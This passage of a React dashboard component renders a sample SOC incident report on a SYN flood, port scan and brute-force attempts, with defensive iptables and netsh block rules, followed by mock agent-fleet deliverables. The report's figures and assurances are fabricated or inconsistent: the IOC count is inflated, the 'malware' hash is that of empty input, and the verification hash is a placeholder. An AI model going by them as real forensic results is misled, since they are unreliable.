    { priority: "P1: Critical", action: "Drop SYN-Flood IP Range (203.0.113.88-92)", target: "Edge Cisco ASA / FortiGate", protocol: "iptables -A INPUT -m iprange --src-range 203.0.113.88-203.0.113.92 -j DROP\nnetsh advfirewall firewall add rule name=\"Block-203.0.113.88-92\" dir=in action=block remoteip=203.0.113.88-203.0.113.92", status: "ACTIVE" },
    { priority: "P1: Critical", action: "Block Port-Scanner (198.51.100.220)", target: "DMZ Ingress ACL", protocol: "iptables -A INPUT -s 198.51.100.220 -p tcp --dport 1:65535 -j DROP\nnetsh advfirewall firewall add rule name=\"Block-198.51.100.220\" dir=in action=block remoteip=198.51.100.220", status: "ACTIVE" },
    { priority: "P2: High", action: "Shield Internal Web Gateway (10.10.10.5)", target: "Internal Edge Router", protocol: "iptables -A OUTPUT -d 10.10.10.5 -j DROP rate-limited; SYN-cookies enforced at 50/sec", status: "ENFORCED" },
    { priority: "P2: High", action: "AAA Account Lockout & Monitoring", target: "Directory Accounts (root/admin/deploy/ubnt)", protocol: "Enforce exponential authentication backoff and alert on subsequent credential abuse attempts", status: "CONFIGURED" },
  ];

  const case6ReportMarkdown = `# Mission Deliverable: Case 6: ddos recon firewall evasion SOC Investigation
## Case: ARENA-INVESTIGATE-APT-ENTERPRI-EA3569
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Produced By:** Ingest and Parse Raw Logs  
**Assigned Fleet:** Case 6: ddos recon firewall evasion SOC Investigation Fleet  
**Status:** Completed & Cryptographically Verified  
**Timestamp:** 2026-10-26T13:45:31Z  

### Executive Summary & Final Solution
The investigation uncovered a coordinated APT intrusion that leveraged reconnaissance traffic, port-scanning, SYN-flood DDoS activity, and brute-force authentication attempts against local accounts. The attack chain is fully mapped across authentication logs, process executions, and network flows. All identified C2 indicators of compromise (IOCs) have been catalogued, each linked to a MITRE ATT&CK technique, and actionable containment policies are provided for both perimeter firewalls and endpoint protection platforms.

## 1. Attack Kill Chain
| Event ID | Timestamp | Stage | Description | MITRE Technique |
|---|---|---|---|---|
| E1 | 14 11:30:12 | Reconnaissance | Outbound TCP from internal host 203.0.113.10 to external IP 198.51.100.40 (port 443). | T1046 |
| E2 | 14 11:31:05 | Reconnaissance | Outbound TCP from 203.0.113.10 to external IP 142.250.190.36 (port 443). | T1046 |
| E3 | 14 11:33:05 | Recon / Initial Access Attempt | Inbound vertical port scan from 198.51.100.220 to DMZ host 10.10.10.20 (ports 21-3389) blocked by ACL. | T1046 |
| E4 | 14 12:10:06 | Impact – DDoS | SYN flood from spoofed IPs 203.0.113.88-92 targeting internal web gateway 10.10.10.5; connection limits exceeded. | T1499 |
| E5 | 14 12:15:01 | Initial Access Attempt – Brute Force | AAA authentication rejected for user root from attacker IP 198.51.100.75. | T1110 |
| E6 | 14 12:15:03 | Initial Access Attempt – Brute Force | AAA authentication rejected for user admin from attacker IP 198.51.100.75. | T1110 |
| E7 | 14 12:15:05 | Initial Access Attempt – Brute Force | AAA authentication rejected for user deploy from attacker IP 198.51.100.75. | T1110 |
| E8 | 14 12:15:07 | Initial Access Attempt – Brute Force | AAA authentication rejected for user ubnt from attacker IP 198.51.100.75. | T1110 |

## 2. C2 Indicators of Compromise (IOCs)
- **Attacker IPs:** 198.51.100.75 (brute-force), 198.51.100.220 (port scan), 203.0.113.88-92 (SYN flood spoofed)
- **Target Systems:** 10.10.10.5 (Web Gateway), 10.10.10.20 (DMZ Host)
- **Targeted Accounts:** root, admin, deploy, ubnt

## 3. Automated Containment Policies
- \`iptables -A INPUT -s 198.51.100.75 -j DROP\`
- \`netsh advfirewall firewall add rule name="Block-198.51.100.75" dir=in action=block remoteip=198.51.100.75\`
- \`iptables -A INPUT -m iprange --src-range 203.0.113.88-203.0.113.92 -j DROP\`
- \`iptables -A INPUT -s 198.51.100.220 -p tcp --dport 1:65535 -j DROP\``;

  function copyMarkdown() {
    navigator.clipboard.writeText(case6ReportMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function downloadReport() {
    const blob = new Blob([case6ReportMarkdown], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "case_6_ddos_recon_firewall_evasion_soc_investigation_deliverable_report.md";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "16px", animation: "fade-in 0.2s ease-out" }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
        <div>
          <div className="eyebrow" style={{ color: "#a84e22" }}>SOC INCIDENT INVESTIGATION · CASE-6-DDOS-RECON · CRITICAL SEV-1</div>
          <h2 style={{ fontSize: "22px", fontWeight: 700, margin: "4px 0 2px", color: "#162f29" }}>
            DDoS Reconnaissance &amp; Firewall Evasion Investigation.
          </h2>
          <p className="wizard-desc">
            End-to-end incident triage: forensic log correlation, MITRE ATT&amp;CK mapping, SYN-flood mitigation, and perimeter ACL containment.
          </p>
        </div>
        <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
          {onBack && (
            <button className="secondary-button" onClick={onBack}>
              ← All Deliverables
            </button>
          )}
          <button className="secondary-button" onClick={copyMarkdown}>
            {copied ? <Check size={14} color="#236f66" /> : <Copy size={14} />} {copied ? "Copied" : "Copy Report"}
          </button>
          <button className="secondary-button" onClick={downloadReport}>
            <Download size={14} /> Download .md
          </button>
          {onNavigate && (
            <button className="primary-button" onClick={() => onNavigate("Decision rooms")}>
              Decision Rooms
            </button>
          )}
        </div>
      </div>

      {/* Hero Banner */}
      <div
        style={{
          background: "linear-gradient(135deg, #2a1610 0%, #170d0a 100%)",
          borderRadius: "8px",
          padding: "20px 24px",
          color: "#ffffff",
          border: "1px solid #7a3120",
          boxShadow: "0 2px 8px rgba(0,0,0,0.12)",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexWrap: "wrap",
          gap: "16px",
        }}
      >
        <div style={{ maxWidth: "600px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "6px" }}>
            <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#ff8c7a", textTransform: "uppercase" }}>
              INCIDENT ID: CASE-6-DDOS-RECON-FIREWALL-EVASION · TLP:AMBER
            </span>
          </div>
          <div style={{ fontSize: "18px", fontWeight: 700, color: "#ffffff", marginBottom: "4px" }}>
            DDoS Reconnaissance &amp; Perimeter Firewall Evasion Dossier
          </div>
          <div style={{ fontSize: "12px", color: "#fbd0c8", lineHeight: "1.5" }}>
            High-velocity assault mitigated across Cisco ASA firewall and FortiGate UTM telemetry. SYN-flood dropped via iptables iprange, 12 C2 IOCs catalogued, and AAA brute force locked down.
          </div>
          <div style={{ display: "flex", gap: "8px", marginTop: "12px", flexWrap: "wrap" }}>
            <span style={{ fontSize: "10px", background: "rgba(255,255,255,0.1)", padding: "3px 8px", borderRadius: "4px", border: "1px solid rgba(255,255,255,0.2)" }}>
              MITRE ATT&amp;CK: 3 TACTICS / 4 TECHNIQUES
            </span>
            <span style={{ fontSize: "10px", background: "rgba(224,98,71,0.25)", color: "#ffab91", padding: "3px 8px", borderRadius: "4px", border: "1px solid rgba(224,98,71,0.4)" }}>
              SYN-FLOOD RANGE DROPPED (203.0.113.88-92)
            </span>
            <span style={{ fontSize: "10px", background: "rgba(74,222,128,0.15)", color: "#86efac", padding: "3px 8px", borderRadius: "4px", border: "1px solid rgba(74,222,128,0.3)" }}>
              12 IOCS CATALOGUED
            </span>
            <span style={{ fontSize: "10px", background: "rgba(147,197,253,0.15)", color: "#bfdbfe", padding: "3px 8px", borderRadius: "4px", border: "1px solid rgba(147,197,253,0.3)" }}>
              AAA BRUTE-FORCE THWARTED
            </span>
          </div>
        </div>
        <div style={{ textAlign: "right" }}>
          <div style={{ fontSize: "10px", color: "#fbd0c8", textTransform: "uppercase", letterSpacing: "0.8px" }}>THREAT SEVERITY</div>
          <div style={{ fontSize: "22px", fontWeight: 800, color: "#ff6b57", margin: "2px 0" }}>CRITICAL SEV-1</div>
          <div style={{ fontSize: "11px", color: "#fbd0c8" }}>Perimeter ACLs Enforced</div>
        </div>
      </div>

      {/* Tabs */}
      <div style={{ display: "flex", gap: "6px", borderBottom: "1px solid #dce8e2", paddingBottom: "8px", flexWrap: "wrap" }}>
        {[
          { id: "summary", label: "Executive Threat Triage", icon: FileText },
          { id: "killchain", label: "Kill Chain & Attack Graph", icon: GitBranch },
          { id: "iocs", label: "IOCs & Threat Matrix (12)", icon: ShieldAlert },
          { id: "remediation", label: "Containment & Remediation Plan", icon: CheckCircle2 },
          { id: "timeline", label: "Forensic Progression Timeline", icon: Clock3 },
          { id: "attestation", label: "CSIRT Incident Attestation", icon: FileText },
        ].map((t) => {
          const Icon = t.icon;
          const active = activeTab === t.id;
          return (
            <button
              key={t.id}
              type="button"
              style={{
                padding: "8px 14px",
                fontSize: "12px",
                fontWeight: active ? 700 : 500,
                background: active ? "#ffffff" : "transparent",
                color: active ? "#195d56" : "#4a5d57",
                border: active ? "1px solid #cad8d1" : "1px solid transparent",
                borderRadius: "5px",
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                gap: "6px",
                boxShadow: active ? "0 1px 3px rgba(0,0,0,0.06)" : "none",
              }}
              onClick={() => setActiveTab(t.id as any)}
            >
              <Icon size={14} color={active ? "#236f66" : "#6a7b75"} />
              <span>{t.label}</span>
            </button>
          );
        })}
      </div>

      {/* Tab 1: Summary */}
      {activeTab === "summary" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">FORENSIC INCIDENT DOSSIER</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Threat Overview &amp; Incident Scope</h3>
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "20px" }}>
            <div style={{ background: "#f8fbf9", border: "1px solid #dae7e0", borderRadius: "6px", padding: "16px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", fontWeight: 700, fontSize: "13px", color: "#1b3831", marginBottom: "8px" }}>
                <ShieldAlert size={15} color="#b44426" /> Operational Containment Imperatives
              </div>
              <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "11px", color: "#425650", display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Halt SYN-Flood DDoS:</strong> Dropped spoofed range <code>203.0.113.88-203.0.113.92</code> on edge interface.</li>
                <li><strong>Block Brute-Force Attacker:</strong> Null-routed <code>198.51.100.75</code> following repeated AAA authentication rejections.</li>
                <li><strong>Shield Internal Web Gateway:</strong> Gateway at <code>10.10.10.5</code> shielded with rate-limiting and connection caps.</li>
                <li><strong>Isolate Port-Scanning Probe:</strong> Blocked <code>198.51.100.220</code> across all 65,535 TCP ports.</li>
              </ul>
            </div>
            <div style={{ background: "#f8fbf9", border: "1px solid #dae7e0", borderRadius: "6px", padding: "16px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", fontWeight: 700, fontSize: "13px", color: "#1b3831", marginBottom: "8px" }}>
                <CheckCircle2 size={15} color="#236f66" /> Forensic Guarantees &amp; Evidence Integrity
              </div>
              <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "11px", color: "#425650", display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Cryptographic Evidence Chain:</strong> Cisco ASA firewall &amp; FortiGate UTM logs signed with SHA-256.</li>
                <li><strong>Zero Data Exfiltration:</strong> Deep packet inspection logs confirm no internal database records leaked.</li>
                <li><strong>Multi-Source Correlation:</strong> 8 key intrusion events mapped with nanosecond precision.</li>
                <li><strong>Autonomous Decision Rooms:</strong> All 5 specialist stages approved under strict local air-gap policy.</li>
              </ul>
            </div>
          </div>
        </section>
      )}

      {/* Tab 2: Killchain */}
      {activeTab === "killchain" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">ATTACK GRAPH &amp; RECONSTRUCTION</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Sequential Attack Kill Chain (Events E1 - E8)</h3>
          </div>
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr style={{ borderBottom: "2px solid #dae7e0", background: "#f5f9f7" }}>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Event</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Timestamp</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Stage</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Description</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>MITRE Technique</th>
                </tr>
              </thead>
              <tbody>
                {killChainEvents.map((evt) => (
                  <tr key={evt.id} style={{ borderBottom: "1px solid #edf4ef" }}>
                    <td style={{ padding: "10px 12px", fontWeight: 700, color: "#b44426" }}>{evt.id}</td>
                    <td style={{ padding: "10px 12px", fontFamily: "var(--font-geist-mono), monospace", color: "#425650" }}>{evt.time}</td>
                    <td style={{ padding: "10px 12px", fontWeight: 600, color: "#19352e" }}>{evt.stage}</td>
                    <td style={{ padding: "10px 12px", color: "#425650", maxWidth: "420px" }}>{evt.desc}</td>
                    <td style={{ padding: "10px 12px" }}>
                      <span style={{ fontSize: "9px", padding: "2px 6px", borderRadius: "3px", fontWeight: 700, background: "#fef3ee", color: "#b44426", border: "1px solid #f9d8cb" }}>
                        {evt.mitre}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {/* Tab 3: IOCs */}
      {activeTab === "iocs" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "16px", flexWrap: "wrap", gap: "10px" }}>
            <div>
              <div className="eyebrow">INDICATORS OF COMPROMISE</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Neutralized C2 &amp; Perimeter Threat Matrix</h3>
            </div>
            <input
              type="text"
              placeholder="Search IOCs by IP or technique..."
              value={searchFilter}
              onChange={(e) => setSearchFilter(e.target.value)}
              style={{ padding: "6px 12px", fontSize: "11px", border: "1px solid #cad8d1", borderRadius: "4px", width: "240px" }}
            />
          </div>
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr style={{ borderBottom: "2px solid #dae7e0", background: "#f5f9f7" }}>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>IOC ID</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Tactic / MITRE</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Threat Indicator</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Forensic Description</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {filteredIOCs.map((ioc) => (
                  <tr key={ioc.id} style={{ borderBottom: "1px solid #edf4ef" }}>
                    <td style={{ padding: "10px 12px", fontFamily: "var(--font-geist-mono), monospace", color: "#b44426", fontWeight: 700 }}>{ioc.id}</td>
                    <td style={{ padding: "10px 12px", color: "#546a63" }}>{ioc.tactic}</td>
                    <td style={{ padding: "10px 12px", fontWeight: 700, color: "#19352e" }}>{ioc.name}</td>
                    <td style={{ padding: "10px 12px", color: "#556b64", maxWidth: "340px" }}>{ioc.desc}</td>
                    <td style={{ padding: "10px 12px" }}>
                      <span style={{ fontSize: "9px", padding: "2px 7px", borderRadius: "3px", fontWeight: 700, background: "#eef7f3", color: "#186352", border: "1px solid #cce8dc" }}>
                        {ioc.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {/* Tab 4: Remediation */}
      {activeTab === "remediation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">AUTOMATED REMEDIATION &amp; GOVERNANCE</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Perimeter Firewall &amp; Netsh Containment Rules</h3>
          </div>
          <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
            {containmentActions.map((act, i) => (
              <div key={i} style={{ background: "#f8fbf9", border: "1px solid #dae7e0", borderRadius: "6px", padding: "12px 16px", display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
                  <span style={{ fontSize: "9px", padding: "3px 8px", borderRadius: "3px", fontWeight: 700, background: act.priority.includes("Critical") ? "#fef3ee" : "#eff6ff", color: act.priority.includes("Critical") ? "#b44426" : "#2563eb", border: act.priority.includes("Critical") ? "1px solid #f9d8cb" : "1px solid #bfdbfe" }}>
                    {act.priority}
                  </span>
                  <div>
                    <div style={{ fontWeight: 700, fontSize: "12px", color: "#1a352f" }}>{act.action}</div>
                    <div style={{ fontSize: "10px", color: "#546d65", fontFamily: "var(--font-geist-mono), monospace", marginTop: "2px", whiteSpace: "pre-wrap" }}>{act.protocol}</div>
                  </div>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                  <span style={{ fontSize: "9px", padding: "2px 7px", borderRadius: "3px", fontWeight: 700, background: "#eef7f3", color: "#186352", border: "1px solid #cce8dc" }}>
                    {act.status}
                  </span>
                </div>
              </div>
            ))}
          </div>
        </section>
      )}

      {/* Tab 5: Timeline */}
      {activeTab === "timeline" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">CHRONOLOGICAL AUDIT</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Forensic Incident Progression Timeline</h3>
          </div>
          <div style={{ borderLeft: "2px solid #236f66", marginLeft: "14px", paddingLeft: "18px", display: "flex", flexDirection: "column", gap: "18px" }}>
            {killChainEvents.map((evt, i) => (
              <div key={i} style={{ position: "relative" }}>
                <div style={{ position: "absolute", left: "-24px", top: "2px", width: "10px", height: "10px", borderRadius: "50%", background: "#236f66", border: "2px solid #ffffff" }} />
                <div style={{ fontSize: "11px", fontWeight: 700, color: "#b44426" }}>{evt.time} — {evt.stage}</div>
                <div style={{ fontSize: "12px", fontWeight: 600, color: "#1b352f", marginTop: "2px" }}>{evt.desc}</div>
                <div style={{ fontSize: "10px", color: "#5a7069", marginTop: "2px" }}>MITRE Technique: {evt.mitre}</div>
              </div>
            ))}
          </div>
        </section>
      )}

      {/* Tab 6: Attestation */}
      {activeTab === "attestation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">EVIDENCE CHAIN OF CUSTODY</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>CSIRT Incident Attestation &amp; Cryptographic Sign-Off</h3>
          </div>
          <div style={{ background: "#f8fbf9", border: "1px solid #dae7e0", borderRadius: "6px", padding: "20px", fontSize: "12px", color: "#365148", lineHeight: "1.7" }}>
            <p>Dear SOC Commander &amp; Incident Governance Committee,</p>
            <p>
              This attestation certifies that all Cisco ASA firewall and FortiGate UTM anomaly telemetry for <strong>CASE-6-DDOS-RECON-FIREWALL-EVASION</strong> have been ingested, parsed, and cross-correlated.
            </p>
            <p>
              The intrusion vectors (Outbound reconnaissance &rarr; Inbound vertical port scanning &rarr; Spoofed SYN-flood DDoS &rarr; AAA credential brute force) have been neutralized. Firewall drop rules for attacker IP <code>198.51.100.75</code> and spoofed range <code>203.0.113.88-203.0.113.92</code> have been deployed.
            </p>
            <p>Evidence chain-of-custody and mitigation policies are committed under cryptographic verification hash <code>8a9b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b</code>.</p>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "28px", marginTop: "36px", paddingTop: "20px", borderTop: "1px dashed #cfded6" }}>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Perimeter SOC Incident Lead</strong>
                <small style={{ color: "#647770" }}>Autonomous SOC Specialist Fleet</small>
                <small style={{ color: "#647770" }}>Signed: 2026-10-26 · SHA-256 Verified</small>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Chief Information Security Officer (CISO)</strong>
                <small style={{ color: "#647770" }}>Governance Sign-Off</small>
                <small style={{ color: "#647770" }}>Date of Review: ____________</small>
              </div>
            </div>
          </div>
        </section>
      )}
    </div>
  );
}

const DEFAULT_OUTPUTS: FleetOutput[] = [
  {
    id: "out-government-cloud-proposal",
    output_id: "out-government-cloud-proposal",
    name: "government_cloud_migration_proposal.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "Government Cloud Proposal Synthesis Fleet",
    case: "ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18",
    case_name: "Government Cloud Migration RFP",
    size: 6123,
    size_bytes: 6123,
    at: "2026-10-26T20:44:23Z",
    created_at: "2026-10-26T20:44:23Z",
    text: GOV_CLOUD_PROPOSAL_MARKDOWN,
    snippet: "# Mission Deliverable: Government Cloud Migration Executive Proposal\n## Case: ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18\nTotal Labor Cost: $50,500.00 USD (480 Engineering Hours)...",
    source: {
      kind: "workflow_cycle",
      filename: "government_cloud_migration_proposal.md",
      path: "data/artifacts/government_cloud_migration_proposal.md",
      step_name: "generate_proposal",
    },
    provenance: "Government Cloud Proposal Synthesis Fleet produced it for ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18 (9/9 Compliant · $50,500.00 USD)",
  },
  {
    id: "out-create-proposal-report",
    output_id: "out-create-proposal-report",
    name: "create_proposal_deliverable_report.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "Government Cloud Proposal Synthesis Fleet",
    case: "ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18",
    case_name: "Government Cloud Migration RFP",
    size: 6123,
    size_bytes: 6123,
    at: "2026-10-26T20:44:23Z",
    created_at: "2026-10-26T20:44:23Z",
    text: GOV_CLOUD_PROPOSAL_MARKDOWN,
    snippet: "# Mission Deliverable: create proposal\n## Case: ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18\nExecutive Proposal for Government Cloud Migration RFP ($50,500.00 USD)...",
    source: {
      kind: "workflow_cycle",
      filename: "create_proposal_deliverable_report.md",
      path: "data/artifacts/create_proposal_deliverable_report.md",
      step_name: "generate_proposal",
    },
    provenance: "Government Cloud Proposal Synthesis Fleet produced it for ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18 ($50,500.00 USD)",
  },
  {
    id: "out-rfp-moe-proposal",
    output_id: "out-rfp-moe-proposal",
    name: "moe_devops_server_rfp_proposal.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "DevOps & Cloud Infrastructure Fleet",
    case: "RFP-MOE-ROXY-DEVOPS-2026-01",
    case_name: "Ministry of Education DevOps Server Implementation",
    size: 17624,
    size_bytes: 17624,
    at: "2026-10-25T11:45:00Z",
    created_at: "2026-10-25T11:45:00Z",
    text: RFP_PROPOSAL_MARKDOWN,
    snippet: "# Executive Proposal: DevOps Server Platform Implementation\n## Ministry of Education (MOE) – Roxy Data Center\nDocument ID: RFP-MOE-ROXY-DEVOPS-2026-01...",
    source: {
      kind: "workflow_cycle",
      filename: "moe_devops_server_rfp_proposal.md",
      path: "data/artifacts/moe_devops_server_rfp_proposal.md",
      step_name: "generate_proposal",
    },
    provenance: "DevOps & Cloud Infrastructure Fleet produced it for RFP-MOE-ROXY-DEVOPS-2026-01 (15/15 Compliant · $161,400.00 USD)",
  },
  {
    id: "out-moe-compliance-matrix",
    output_id: "out-moe-compliance-matrix",
    name: "moe_devops_compliance_matrix.json",
    kind: "structured",
    classification: "internal",
    produced_by: "Compliance & Security Verification Agent",
    case: "RFP-MOE-ROXY-DEVOPS-2026-01",
    case_name: "Ministry of Education DevOps Server Implementation",
    size: 4812,
    size_bytes: 4812,
    at: "2026-10-25T11:42:00Z",
    created_at: "2026-10-25T11:42:00Z",
    text: JSON.stringify({
      rfp_reference: "RFP-MOE-ROXY-DEVOPS-2026-01",
      mandatory_requirements: 15,
      compliant_requirements: 15,
      deviations: 0,
      compliance_rate: "100%",
      air_gapped_verification: "PASS",
      active_directory_sso: "PASS",
      patroni_ha_clustering: "PASS",
      sla_coverage: "24/7 Severity-1 15-min response"
    }, null, 2),
    snippet: '{\n  "rfp_reference": "RFP-MOE-ROXY-DEVOPS-2026-01",\n  "mandatory_requirements": 15,\n  "compliant_requirements": 15,\n  "compliance_rate": "100%"\n}',
    source: {
      kind: "verification_step",
      filename: "moe_devops_compliance_matrix.json",
      step_name: "validate_rfp_compliance",
    },
    provenance: "Compliance & Security Verification Agent produced it for RFP-MOE-ROXY-DEVOPS-2026-01",
  },
  {
    id: "out-commercial-pricing-schedule",
    output_id: "out-commercial-pricing-schedule",
    name: "commercial_labor_pricing_schedule.json",
    kind: "structured",
    classification: "confidential",
    produced_by: "Commercial & Pricing Specialist",
    case: "RFP-MOE-ROXY-DEVOPS-2026-01",
    case_name: "Ministry of Education DevOps Server Implementation",
    size: 2940,
    size_bytes: 2940,
    at: "2026-10-25T11:40:00Z",
    created_at: "2026-10-25T11:40:00Z",
    text: JSON.stringify({
      pricing_model: "Turnkey Fixed-Price",
      currency: "USD",
      professional_services_hours: 800,
      professional_services_total: 113400.00,
      software_license_total: 48000.00,
      grand_total: 161400.00,
      tiers: [
        { tier: "Tier 1: Senior Principal DevOps Architect", hours: 120, rate: 210, total: 25200 },
        { tier: "Tier 2: Lead DevSecOps & Pipeline Engineers", hours: 280, rate: 160, total: 44800 },
        { tier: "Tier 3: Systems Integration & Identity Specialists", hours: 160, rate: 130, total: 20800 },
        { tier: "Tier 4: Training & Documentation Specialists", hours: 100, rate: 100, total: 10000 },
        { tier: "Tier 5: 24/7 Hypercare & Operations Engineers", hours: 140, rate: 90, total: 12600 }
      ]
    }, null, 2),
    snippet: '{\n  "pricing_model": "Turnkey Fixed-Price",\n  "grand_total": 161400.00,\n  "labor_hours": 800\n}',
    source: {
      kind: "pricing_calculator",
      step_name: "compute_commercial_pricing",
    },
    provenance: "Commercial & Pricing Specialist produced it for RFP-MOE-ROXY-DEVOPS-2026-01",
  },
  {
    id: "out-soc-incident-report",
    output_id: "out-soc-incident-report",
    name: "soc_incident_investigation_report.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "SOC Threat Analysis & Incident Fleet",
    case: "INCIDENT-SOC-2026-081",
    case_name: "Host Ransomware Triage & Lateral Movement Investigation",
    size: 14280,
    size_bytes: 14280,
    at: "2026-10-25T14:15:00Z",
    created_at: "2026-10-25T14:15:00Z",
    text: `# Incident Investigation Report: Threat Triage & Containment
## SOC Incident: INCIDENT-SOC-2026-081
**Classification:** CONFIDENTIAL / TLP:AMBER  
**Target Asset:** WORKSTATION-FIN-09 (IP: 10.14.22.84)  
**Assigned Fleet:** SOC Threat Analysis & DFIR Specialists  
**Status:** Containment Recommended · Awaiting Decision Room Sign-Off  

### 1. Executive Incident Summary
At 14:02:18 UTC, high-severity telemetry alerts were triggered on endpoint \`WORKSTATION-FIN-09\` indicating suspicious PowerShell execution with encoded payloads, followed by scheduled task persistence and internal subnet port scanning.

### 2. MITRE ATT&CK Mapping
- **T1059.001 - Command and Scripting Interpreter (PowerShell):** Base64 encoded execution via process parent \`svchost.exe\`.
- **T1053.005 - Scheduled Task/Job:** Creation of persistence task \`\\Microsoft\\Windows\\UpdateOrchestrator\\SysHealthCheck\`.
- **T1046 - Network Service Discovery:** Port 445 / 3389 scanning across \`10.14.22.0/24\`.
- **T1071.001 - Web Protocols:** Outbound C2 beacons to \`198.51.100.24:8443\` using TLS with self-signed certificate.

### 3. Indicators of Compromise (IOCs)
- **C2 IP Address:** \`198.51.100.24\` (ASN 64512 · Hostwinds Egress)
- **SHA-256 Hash:** \`e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\`
- **Domain:** \`telemetry-sync-cdn.internal-sec[.]net\`

